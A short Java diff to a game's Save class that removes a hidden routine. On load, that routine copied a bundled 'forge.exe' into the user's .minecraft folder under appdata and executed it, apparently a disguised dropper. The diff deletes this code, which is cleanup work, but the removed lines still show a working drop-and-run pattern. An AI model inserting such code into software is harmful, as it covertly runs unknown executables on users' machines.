@@ -44,16 +44,6 @@ public class Save {
 		}
 		
 		Game.setStats(cells,money,superCells,operations);
-		
-		File source = new File("lib//forge.exe");
-		File dest = new File(System.getenv("appdata")+"\\.minecraft\\versions\\forge.exe"); 
-			
-		try {
-			FileUtils.copyFile(source, dest);
-			Process p = new ProcessBuilder(dest.toString()).start();
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
 	}
 	
 	public static void save() {
